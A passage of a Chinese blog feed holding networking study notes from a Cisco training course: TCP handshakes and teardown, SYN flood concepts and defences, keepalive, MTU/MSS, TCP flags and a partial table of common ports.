Workstation/NTServer中，微软普遍采用Ctrl-Alt-Delete这套安全注意键以避免可能的安全性问题，微软在Windows2000后便在个人计算机上取消了这种登陆方式（自然可以选择在组策略中打开），目前WindowsServer系列还是普遍默认通过按Ctrl-Alt-Delete进行登陆操作。</p><p>Windows的默认Secure AttentionKey是<code>Ctrl-Alt-Delete</code>，Linux下可以可以使用<code>loadkeys</code>等工具自定义SecureAttention Key。</p><p>微软的工程师们一方面从内核下手、一方面从人的使用习惯，确保了系统的登录安全，又不失简洁美感。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>思科人才孵化项目 Day6</title>
      <link href="/2022/04/09/si-ke-fu-hua-xiang-mu-day6/"/>
      <url>/2022/04/09/si-ke-fu-hua-xiang-mu-day6/</url>
      
        <content type="html"><![CDATA[<h1 id="思科孵化项目-day6">思科孵化项目 Day6</h1><h2 id="tcp-的特性">TCP 的特性</h2><ul><li>TCP 提供一种<strong>面向连接的、可靠的</strong>字节流服务</li><li>在一个 TCP 连接中，仅有两方进行彼此通信。广播和多播不能用于 TCP</li><li>TCP 使用校验和，确认和重传机制来保证可靠传输</li><li>TCP给数据分节进行排序，并使用累积确认保证数据的顺序不变和非重复</li><li>TCP使用滑动窗口机制来实现流量控制，通过动态改变窗口的大小进行拥塞控制</li></ul><p><strong>注意</strong>：TCP并不能保证数据一定会被对方接收到，因为这是不可能的。TCP能够做到的是，如果有可能，就把数据递送到接收方，否则就（通过放弃重传并且中断连接这一手段）通知用户。因此准确说TCP 也不是 100%可靠的协议，它所能提供的是数据的可靠递送或故障的可靠通知。</p><h2 id="三次握手与四次挥手">三次握手与四次挥手</h2><p>所谓三次握手(Three-way Handshake)，是指建立一个 TCP连接时，需要客户端和服务器总共发送3个包。</p><p>三次握手的目的是连接服务器指定端口，建立 TCP连接，并同步连接双方的序列号和确认号，交换 TCP 窗口大小信息。在 socket编程中，客户端执行 <code>connect()</code> 时。将触发三次握手。</p><ul><li><p>第一次握手(SYN=1, seq=x):</p><p>客户端发送一个 TCP 的 SYN标志位置1的包，指明客户端打算连接的服务器的端口，以及初始序号X,保存在包头的序列号(Sequence Number)字段里。</p><p>发送完毕后，客户端进入 <code>SYN_SEND</code> 状态。</p></li><li><p>第二次握手(SYN=1, ACK=1, seq=y, ACKnum=x+1):</p><p>服务器发回确认包(ACK)应答。即 SYN 标志位和 ACK标志位均为1。服务器端选择自己 ISN 序列号，放到 Seq域里，同时将确认序号(Acknowledgement Number)设置为客户的 ISN加1，即X+1。 发送完毕后，服务器端进入 <code>SYN_RCVD</code>状态。</p></li><li><p>第三次握手(ACK=1，ACKnum=y+1)</p><p>客户端再次发送确认包(ACK)，SYN 标志位为0，ACK标志位为1，并且把服务器发来 ACK的序号字段+1，放在确定字段中发送给对方，并且在数据段放写ISN的+1</p><p>发送完毕后，客户端进入 <code>ESTABLISHED</code>状态，当服务器端接收到这个包时，也进入 <code>ESTABLISHED</code>状态，TCP 握手结束。</p></li></ul><p>三次握手的过程的示意图如下：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/HIT-Alibaba/interview/master/img/tcp-connection-made-three-way-handshake.png" alt="three-way-handshake"><figcaption aria-hidden="true">three-way-handshake</figcaption></figure><p>TCP 的连接的拆除需要发送四个包，因此称为四次挥手(Four-wayhandshake)，也叫做改进的三次握手。客户端或服务器均可主动发起挥手动作，在socket 编程中，任何一方执行 <code>close()</code>操作即可产生挥手操作。</p><ul><li><p>第一次挥手(FIN=1，seq=x)</p><p>假设客户端想要关闭连接，客户端发送一个 FIN标志位置为1的包，表示自己已经没有数据可以发送了，但是仍然可以接受数据。</p><p>发送完毕后，客户端进入 <code>FIN_WAIT_1</code> 状态。</p></li><li><p>第二次挥手(ACK=1，ACKnum=x+1)</p><p>服务器端确认客户端的 FIN包，发送一个确认包，表明自己接受到了客户端关闭连接的请求，但还没有准备好关闭连接。</p><p>发送完毕后，服务器端进入 <code>CLOSE_WAIT</code>状态，客户端接收到这个确认包之后，进入 <code>FIN_WAIT_2</code>状态，等待服务器端关闭连接。</p></li><li><p>第三次挥手(FIN=1，seq=y)</p><p>服务器端准备好关闭连接时，向客户端发送结束连接请求，FIN 置为1。</p><p>发送完毕后，服务器端进入 <code>LAST_ACK</code>状态，等待来自客户端的最后一个ACK。</p></li><li><p>第四次挥手(ACK=1，ACKnum=y+1)</p><p>客户端接收到来自服务器端的关闭请求，发送一个确认包，并进入<code>TIME_WAIT</code>状态，等待可能出现的要求重传的 ACK 包。</p><p>服务器端接收到这个确认包之后，关闭连接，进入 <code>CLOSED</code>状态。</p><p>客户端等待了某个固定时间（两个最大段生命周期，2MSL，2 Maximum SegmentLifetime）之后，没有收到服务器端的 ACK，认为服务器端已经正常关闭连接，于是自己也关闭连接，进入<code>CLOSED</code> 状态。</p></li></ul><p>四次挥手的示意图如下：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/HIT-Alibaba/interview/master/img/tcp-connection-closed-four-way-handshake.png" alt="four-way-handshake"><figcaption aria-hidden="true">four-way-handshake</figcaption></figure><h2 id="syn攻击">SYN攻击</h2><ul><li><p>什么是 SYN 攻击（SYN Flood）？</p><p>在三次握手过程中，服务器发送 SYN-ACK 之后，收到客户端的 ACK 之前的TCP 连接称为半连接(half-open connect)。此时服务器处于 SYN_RCVD状态。当收到 ACK 后，服务器才能转入 ESTABLISHED 状态.</p><p>SYN攻击指的是，攻击客户端在短时间内伪造大量不存在的IP地址，向服务器不断地发送SYN包，服务器回复确认包，并等待客户的确认。由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，导致目标系统运行缓慢，严重者会引起网络堵塞甚至系统瘫痪。</p><p>SYN 攻击是一种典型的 DoS/DDoS 攻击。</p></li><li><p>如何检测 SYN 攻击？</p><p>检测 SYN攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源IP地址是随机的，基本上可以断定这是一次SYN攻击。在Linux/Unix 上可以使用系统自带的 netstats 命令来检测 SYN 攻击。</p></li><li><p>如何防御 SYN 攻击？</p><p>SYN攻击不能完全被阻止，除非将TCP协议重新设计。我们所做的是尽可能的减轻SYN攻击的危害，常见的防御SYN 攻击的方法有如下几种：</p><ul><li>缩短超时（SYN Timeout）时间</li><li>增加最大半连接数</li><li>过滤网关防护</li><li>SYN cookies技术</li></ul></li></ul><h2 id="tcp-keepalive">TCP KeepAlive</h2><p>TCP的连接，实际上是一种纯软件层面的概念，在物理层面并没有“连接”这种概念。TCP通信双方建立交互的连接，但是并不是一直存在数据交互，有些连接会在数据交互完毕后，主动释放连接，而有些不会。在长时间无数据交互的时间段内，交互双方都有可能出现掉电、死机、异常重启等各种意外，当这些意外发生之后，这些TCP连接并未来得及正常释放，在软件层面上，连接的另一方并不知道对端的情况，它会一直维护这个连接，长时间的积累会导致非常多的半打开连接，造成端系统资源的消耗和浪费，为了解决这个问题，在传输层可以利用TCP 的 KeepAlive机制实现来实现。主流的操作系统基本都在内核里支持了这个特性。</p><p>TCP KeepAlive的基本原理是，隔一段时间给连接对端发送一个探测包，如果收到对方回应的ACK，则认为连接还是存活的，在超过一定重试次数之后还是没有收到对方的回应，则丢弃该TCP 连接。</p><p><a href="http://www.tldp.org/HOWTO/html_single/TCP-Keepalive-HOWTO/">TCP-Keepalive-HOWTO</a>有对 TCP KeepAlive特性的详细介绍，有兴趣的同学可以参考。这里主要说一下，TCP KeepAlive的局限。首先 TCP KeepAlive 监测的方式是发送一个 probe包，会给网络带来额外的流量，另外 TCP KeepAlive只能在内核层级监测连接的存活与否，而连接的存活不一定代表服务的可用。例如当一个服务器CPU 进程服务器占用达到 100%，已经卡死不能响应请求了，此时 TCP KeepAlive依然会认为连接是存活的。因此 TCP KeepAlive对于应用层程序的价值是相对较小的。需要做连接保活的应用层程序，例如QQ，往往会在应用层实现自己的心跳功能。</p><h3 id="参考资料">参考资料</h3><ul><li>计算机网络：自顶向下方法</li><li><a href="http://www.cnblogs.com/hnrainll/archive/2011/10/14/2212415.html">TCP三次握手及四次挥手详细图解</a></li><li><a href="http://www.cnblogs.com/rootq/articles/1377355.html">TCP协议三次握手过程分析</a></li><li><a href="http://blog.csdn.net/whuslei/article/details/6667471">TCP协议中的三次握手和四次挥手(图解)</a></li><li><a href="http://baike.baidu.com/subview/32754/8048820.htm">百度百科：SYN攻击</a></li><li><a href="http://www.tldp.org/HOWTO/html_single/TCP-Keepalive-HOWTO/">TCP-Keepalive-HOWTO</a></li></ul><h2 id="ip分片和tcp分段">IP分片和TCP分段</h2><h3 id="最大传输单元-mtumaximumtransmission-unit">最大传输单元MTU（MaximumTransmission Unit）</h3><p>以太网和802.3对数据帧的长度都有一个限制，其最大值分别是1500和1492个字节。链路层的这个特性称作MTU。不同类型的网络大多数都有一个上限。如果IP层有一个数据要传，且数据的长度比链路层的MTU还大，那么IP层就要进行分片（fragmentation），把数据报分成若干片，这样每一个分片都小于MTU。</p><p>把一份IP数据报进行分片以后，由到达目的端的IP层来进行重新组装，其目的是使分片和重新组装过程对运输层（TCP/UDP）是透明的。由于每一分片都是一个独立的包，当这些数据报的片到达目的端时有可能会失序，<strong>但是在IP首部中有足够的信息让接收端能正确组装这些数据报片</strong>。</p><p>尽管IP分片过程看起来透明的，但有一点让人不想使用它：<strong>即使只丢失一片数据也要重新传整个数据报</strong>。</p><p>why？因为<strong>IP层本身没有超时重传机制</strong>------由更高层（比如TCP）来负责超时和重传。当来自TCP报文段的某一片丢失后，TCP在超时后会重发整个TCP报文段，该报文段对应于一份IP数据报（而不是一个分片），没有办法只重传数据报中的一个数据分片。</p><p>使用UDP很容易导致IP分片，TCP试图避免IP分片。那么TCP是如何试图避免IP分片的呢？其实说白了，采用TCP协议进行数据传输是不会造成IP分片的，因为一旦TCP数据过大，超过了MSS，则在传输层会对TCP包进行分段（如何分，见下文！），自然到了IP层的数据报肯定不会超过MTU，当然也就不用分片了。而对于UDP数据报，如果UDP组成的IP数据报长度超过了1500，那么IP数据报显然就要进行分片，<strong>因为UDP不能像TCP一样自己进行分段</strong>。</p><p>总结：<strong>UDP不会分段，就由我IP来分。TCP会分段，当然也就不用我IP来分了！</strong></p><h3 id="mssmaxitum-segmentsize最大分段大小">MSS（MaxitumSegmentSize）最大分段大小</h3><p>是TCP协议里面的一个概念</p><p>MSS就是TCP数据包每次能够传输的最大数据分段。为了达到最佳的传输效能TCP协议在建立连接的时候通常要协商双方的MSS值，这个值TCP协议在实现的时候往往用MTU值代替（需要减去IP数据包包头的大小20Bytes和TCP数据段的包头20Bytes）所以往往MSS为1460。通讯双方会根据双方提供的MSS值得最小值确定为这次连接的最大MSS值。</p><p>还有最后一个问题：TCP是如何实现分段的呢？其实TCP无所谓分段，因为<strong>每个TCP数据报在组成前其大小就已经被MSS限制了，所以TCP数据报的长度是不可能大于MSS的</strong>，当然由它形成的IP包的长度也就不会大于MTU，自然也就不用IP分片了</p><h2 id="应用场景">应用场景</h2><h3 id="避免-ipv4-分段tcp-mss-用途及其工作原理">避免 IPv4 分段：TCP MSS用途及其工作原理</h3><p>TCP 最大分段大小 (MSS) 定义主机希望在单个 TCP/IPv4数据报中接受的最大数据量。此 TCP/IPv4 数据报可能会在 IPv4 层分段。MSS值仅作为 TCP SYN 数据段中的一个 TCP 报头选项发送。TCP连接的每一端都会向另一端报告其 MSS值。与普遍看法相反的是，不会在主机之间协商 MSS 值。发送主机需要将单个TCP 分段中的数据量限制为小于等于接收主机报告的 MSS 值。</p><p>最初，MSS 决定着接收站上分配用于存储单个 IPv4 数据报所含 TCP数据的缓冲区的大小（大于等于 65496 字节）。MSS 是指 TCP接收端愿意接受的最大数据分段 (chunk)。此 TCP 分段可以长达 64K（最大的IPv4 数据报长度）；要通过网络将其传输到接收主机，可以在 IPv4层对其进行分段。在将完整的 TCP 分段传送至 TCP 层之前，接收主机会重组IPv4 数据报。</p><p>下面的几个场景展示如何设置 MSS 值并将其用于限制 TCP分段大小，从而限制 IPv4 数据报的大小。</p><p>方案 1 说明了 MSS 的最初实现方式。主机 A 的缓冲区为 16K，主机 B的缓冲区为 8K。它们发送和接收各自的 MSS 值，并调整用于相互发送数据的发送MSS。请注意，主机 A 和主机 B 必须将大于接口 MTU、但仍小于发送 MSS 的IPv4 数据报分段，因为 TCP 堆栈可以将 16K 或 8K字节的数据从堆栈向下传递到 IPv4。至于主机B，可以对数据包执行两次分段，一次是为了在令牌环 LAN上传输，另一次是为了在以太网 LAN 上传输。</p><h4 id="场景-1">场景 1</h4><figure><img src="https://googles.plus/images/loading.gif" data-original="https://www.cisco.com/c/dam/en/us/support/docs/ip/generic-routing-encapsulation-gre/25885-pmtud-ipfrag-02.gif" alt="场景 1"><figcaption aria-hidden="true">场景 1</figcaption></figure><ol type="1"><li>主机 A 将其 MSS 值 16K 发送到主机 B。</li><li>主机 B 收到来自主机 A 的 MSS 值 16K。</li><li>主机 B 将其发送 MSS 值设置为 16K。</li><li>主机 B 将其 MSS 值 8K 发送到主机 A。</li><li>主机 A 收到来自主机 B 的 MSS 值 8K。</li><li>主机 A 将其发送 MSS 值设置为 8K。</li></ol><p>为了帮助在 TCP 连接终端避免 IPv4 分段，MSS值的选择被改为最小缓冲区大小和传出接口的 MTU (- 40 字节)。由于 MSS 只是TCP 数据的大小，不包括 20 字节的 IPv4 报头和 20 字节的 TCP 报头，因此MSS 值比 MTU 值要小 40 个字节。MSS基于默认报头大小；发送端堆栈必须根据使用的 TCP 或 IPv4 选项减去 IPv4报头和 TCP 报头的相应值。</p><p>MSS 现在的工作方式是，各个主机首先比较传出接口的 MTU和自己的缓冲区大小，然后选择最小的值作为发送 MSS 值。主机然后比较收到的MSS 大小和自己的接口 MTU，然后选择两者之间的较小值。</p><p>场景 2说明了发送者为避免在本地和远程线路上分段而需要额外采取的步骤。请关注各个主机（在相互发送自己的MSS 值之前）如何考虑传出接口的 MTU 以及这如何有助于避免分段。</p><h4 id="场景-2">场景 2</h4><figure><img src="https://googles.plus/images/loading.gif" data-original="https://www.cisco.com/c/dam/en/us/support/docs/ip/generic-routing-encapsulation-gre/25885-pmtud-ipfrag-03.gif" alt="场景2"><figcaption aria-hidden="true">场景2</figcaption></figure><ol type="1"><li>主机 A 比较其 MSS 缓冲区 (16K) 和其 MTU (1500 - 40 =1460)，并使用较小的值作为 MSS (1460)，以便发送到主机 B。</li><li>主机 B 收到主机 A 的发送 MSS (1460)，并将其与出站接口 MTU - 40 的值(4422) 相比较。</li><li>主机 B 将较低的值 (1460) 设置为 MSS，以便向主机 A 发送 IPv4数据报。</li><li>主机 B 比较其 MSS 缓冲区 (8K) 和其 MTU (4462 - 40 = 4422)，并使用4422 作为 MSS，以便发送到主机 A。</li><li>主机 A 收到主机 B 的发送 MSS (4422)，并将其与出站接口 MTU - 40 的值(1460) 相比较。</li><li>主机 A 将较低的值 (1460) 设置为 MSS，以便向主机 B 发送 IPv4数据报。</li></ol><p>1460 便是两台主机为彼此选择的发送 MSS 的值。通常 TCP 连接两端的发送MSS 值相同。</p><p>在场景 2 中，由于主机考虑到各自的传出接口 MTU，因此 TCP连接终端不会发生分段。如果路由器 A 与路由器 B 之间链路的 MTU低于任一主机的出站接口MTU，则在两个路由器之间的网络中仍会对数据包分段。</p><h2 id="tcp和udp的重要特性">TCP和UDP的重要特性</h2><p><img src="https://googles.plus/images/loading.gif" data-original="\images\365115-20180330095559986-667827887.png"></p><h2 id="osi模型">OSI模型</h2><p><img src="https://googles.plus/images/loading.gif" data-original="\images\365115-20180330095441449-2136619224.png"></p><h2 id="总结">总结</h2><h3 id="tcp">TCP</h3><p>除了提供分段、提供端号之外，还提供其他的，所以可靠，但是对带宽消耗大</p><ul><li>TCP： 传输控制协议–面向连接的可靠传输协议<br></li><li>除完成传输层基本工作外，还需要保障数据的可靠传输；<br></li><li>面向连接：三次握手–建立端到端的虚链路<br></li><li>可靠传输：确认、重传、排序、流控（滑动窗口机制）</li></ul><blockquote><p>注：对于带宽的占用较高；不建议传输实时流量　 仅支持单播</p></blockquote><blockquote><p>排序：每个包上都有相应的序号；</p><p>流控一般窗口号是几就发多个包一次性回确认，再加包1000变成2000回确认，如果只收了前1500后500没有收到则变成1500</p><p>（即<strong>降速——&gt;升速——&gt;降速——&gt;升速——&gt;</strong>……）</p></blockquote><h4 id="tcp-协议中的-psh-和-urg">TCP 协议中的 PSH 和 URG</h4><p>TCP Flag 字段中有两个较为少用的标志：</p><ul><li><p>PSH：推送</p></li><li><p>URG：紧急</p></li></ul><h5 id="psh-标志">PSH 标志</h5><p>要明白 PSH 标志，得先了解 TCP 是如何缓冲数据的。如下图所示：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://zhengyinyong.com/images/tcp-buffer.png"></p><p>发送方从应用层接收数据到缓冲区直到达到某个大小开始发送；接收方从缓冲区接收数据，直到达到某个大小开始上报给用户层。在大多数情况下，这种工作模式是很有效率的。</p><p>试想在要求实时交互通信的场景（比如启动一个 Telnet连接）：一端的应用进程希望在键入一个命令后立即就能收到对方的响应。如果还是上述的工作模式，有可能你输入的数据太少，未满足发送缓冲大小导致无法发送亦或者接收到的数据太小还没有投递到应用层，这样都会导致响应的不及时。</p><p>引入 PSH 标志，可以做到：</p><ul><li><p>提醒发送方立即发送这段数据；</p></li><li><p>提醒接收方立即将数据投递到应用层；</p></li></ul><p>说白了，就是：<strong>赶快发，赶快收。</strong></p><h5 id="urg-标志">URG 标志</h5><p>区别于 PSH 标志，URG 标志的使用必须结合 URG 指针，如下图所示：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://zhengyinyong.com/images/urgent-flag-pointer.png"></p><p>要理解 URG标志，得先了解什么是「紧急数据」。顾名思义，紧急数据就是优先级非常高，需要立即处理的数据。例如，一个程序在远程主机上运行并与之有大量的数据通讯，后发生一些问题，需要立刻取消该程序的运行，故从键盘中发出中断命令（Ctrl+G）。如果不使用紧急数据，则这两个字符将被存储在TCP发送数据的末尾发送，且接收方也在处理完其他数据后最后处理这两个字符，从而浪费很多时间。</p><p>当 URG = 1 时，发送应用进程就告诉发送方 TCP有紧急数据要传送，于是<strong>发送方 TCP就把紧急数据插入到报文段的最前面，而紧急数据后面的数据仍然是普通数据</strong>。紧急指针（UrgentPointer）就是表示本报文段中紧急数据的字节数（紧急数据结束后就是普通数据），即<strong>紧急数据末尾在报文段中的位置</strong>。当所有紧急数据都处理完，TCP就告诉应用层序恢复到正常操作。值得注意的是，即使窗口为0，也可发紧急数据。</p><h3 id="udp">UDP</h3><p>只提供分段和端号，不可靠，但是对带宽占用小</p><ul><li><p>UDP：用户数据报文协议–非面向连接的不可靠传输协议</p></li><li><p>仅完成传输的基本工作–分段、端口</p></li><li><p>对于带宽的占用较低，常用于实时流量的传输</p></li><li><p>支持单播、组播、广播 　　 注： Window size：TCP窗口机制（主要是滑动窗口机制）中TCPheader中的字段；指接收端的窗口，即接收窗口，用来告知发送端自己所能接收的数据量，从而达到一部分流控的目的</p></li><li><p>MTU：最大传输单元，1500k</p></li><li><p>端口号：0-65535</p><ul><li>1-1023注明端口</li><li>1024-65535：高端口-动态端口</li></ul></li></ul><pre class="line-numbers language-none"><code class="language-none">　　　　　　　　　目标服务 　　　　　　　　　　　　 源端进程　　（可以同一个服务器提供不同的服务） （即分配给QQ等程序的，电脑中的进程号）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="ipv4报头">IPV4报头：</h2><p>ARP：地址解析协议—通过对端的某个地址来获取对端的另一个地址<br>AARP：正向ARP—已知对端的IP地址，通过广播来获取对赌的MAC地址（在一个广播域内）<br>RARP：反向ARP —已知对端MAC地址，通过二层单播来获取对端的IP（二层单播）<br>FARP：无故ARP ----刚使用IP地址时，对将要使用的IP地址，进行正向ARP；用于地址的冲突检测（即在手动配IP后做的地址冲突检测）</p><p>TCP/IP和OSI模型的区别：</p><ol type="1"><li>层数不同 5层或4层；7层</li><li>TCP/IP仅支持的IP协议；OSI支持所有的网络层</li><li>TCP/IP协议支持的跨层封装应用层直接封装到3层或2层；用于设备间沟通的流量</li></ol><h3 id="补充">补充：</h3><p>应用程序间沟通的流量正常不会跨层，跨层封装只有5层—&gt;3层和5层—&gt;2层<br>当4层被取消时，分段和进程标记的功能就没有了，此时3层报头将完成这一工作<br>使用分片行为，将流量分片后逐一填充到IPV4报头内，使用协议号来标示上层的信息<br>当3/4层都被取消时，2层报头将完成分段和进程标记的功能<br>以太网第二代封装技术，仅存在类型号可以标记进程， 但无分片功能，若需要跨层封装到二层时，将使用以太网第一代帧——IEEE802.2和802.3标准（即使用LLC和MAC两个子层构成）</p><h2 id="tcpudp常用服务端口列表">TCP/UDP常用服务端口列表</h2><table><colgroup><col style="width: 14%"><col style="width: 77%"><col style="width: 7%"></colgroup><thead><tr class="header"><th style="text-align: center;">端口</th><th style="text-align: center;">描述</th><th style="text-align: center;">状态</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0/TCP,UDP</td><td style="text-align: center;">保留端口；不使用（若发送过程不准备接受回复消息，则可以作为源端口）</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">1/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=TCPMUX&amp;action=edit&amp;redlink=1">TCPMUX</a>（传输控制协议端口服务多路开关选择器）</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">5/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=Remote_Job_Entry&amp;action=edit&amp;redlink=1">RJE</a>（远程作业登录）</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">7/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/Echo_(命令)">Echo</a>（回显）协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">9/UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/抛弃协议">抛弃协议</a></td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">9/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/网络唤醒">网络唤醒</a></td><td style="text-align: center;">非官方</td></tr><tr class="odd"><td style="text-align: center;">11/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=SYSTAT&amp;action=edit&amp;redlink=1">SYSTAT</a>协议</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">13/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/DAYTIME协议">DAYTIME协议</a></td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">15/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=NETSTAT&amp;action=edit&amp;redlink=1">NETSTAT</a>协议</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">17/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=QOTD&amp;action=edit&amp;redlink=1">QOTD</a>（Quoteof the Day，每日引用）协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">18/TCP,UDP</td><td style="text-align: center;">消息发送协议</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">19/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=CHARGEN&amp;action=edit&amp;redlink=1">CHARGEN</a>（字符发生器）协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">20/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/文件传输协议">文件传输协议</a> -默认数据端口</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">21/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/文件传输协议">文件传输协议</a> -控制端口</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">22/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/Secure_Shell">SSH</a>（SecureShell） - 安全远程登录协议，用于安全文件传输（<a href="https://zh.wikipedia.org/wiki/安全复制">SCP</a>、<a href="https://zh.wikipedia.org/wiki/SSH文件传输协议">SFTP</a>）及<a href="https://zh.wikipedia.org/wiki/端口转发">端口转发</a></td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">23/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/Telnet">Telnet</a>终端仿真协议 -未加密文本通信</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">25/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/简单邮件传输协议">SMTP（简单邮件传输协议）</a>- 用于传递<a href="https://zh.wikipedia.org/wiki/电子邮件">电子邮件</a></td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">26/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=RSFTP&amp;action=edit&amp;redlink=1">RSFTP</a>- 一个简单的类似FTP的协议</td><td style="text-align: center;">非官方</td></tr><tr class="odd"><td style="text-align: center;">35/TCP,UDP</td><td style="text-align: center;">任意的私有打印机服务端口</td><td style="text-align: center;">非官方</td></tr><tr class="even"><td style="text-align: center;">37/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/時間協議">TIME时间协议</a></td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">39/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=资源定位协议&amp;action=edit&amp;redlink=1">ResourceLocation Protocol（资源定位协议）</a></td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">41/TCP,UDP</td><td style="text-align: center;">图形</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">42/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/ARPA主机名服务器协议">Host NameServer</a></td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">42/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/WINS">WINS</a>（WINS主机名服务）</td><td style="text-align: center;">非官方</td></tr><tr class="odd"><td style="text-align: center;">43/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/WHOIS">WHOIS</a>协议</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">49/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/TACACS">TACACS</a>登录主机协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">53/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/域名服务器">DNS</a>（域名服务系统）</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">56/TCP,UDP</td><td style="text-align: center;">远程访问协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">57/TCP</td><td style="text-align: center;">MTP，邮件传输协议</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">67/UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/BOOTP">BOOTP</a>（BootStrap协议）服务；同时用于<a href="https://zh.wikipedia.org/wiki/动态主机设置协议">动态主机设置协议</a></td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">68/UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/BOOTP">BOOTP</a>客户端；同时用于<a href="https://zh.wikipedia.org/w/index.php?title=动态主机设定协议&amp;action=edit&amp;redlink=1">动态主机设定协议</a></td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">69/UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/小型文件传输协议">小型文件传输协议</a>（小型文件传输协议）</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">70/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/Gopher">Gopher</a></td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">79/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/手指">手指</a>协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">80/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/超文本传输协议">超文本传输协议</a>（超文本传输协议）或<a href="https://zh.wikipedia.org/wiki/快速UDP网络连接">快速UDP网络连接</a>-用于传输网页</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">81/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/XB_Browser">XB Browser</a> - <a href="https://zh.wikipedia.org/wiki/Tor">Tor</a></td><td style="text-align: center;">非官方</td></tr><tr class="odd"><td style="text-align: center;">82/UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/XB_Browser">XB Browser</a> -控制端口</td><td style="text-align: center;">非官方</td></tr><tr class="even"><td style="text-align: center;">88/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/Kerberos">Kerberos</a> -认证代理</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">101/TCP</td><td style="text-align: center;">主机名</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">102/TCP</td><td style="text-align: center;">ISO-TSAP协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">107/TCP</td><td style="text-align: center;">远程<a 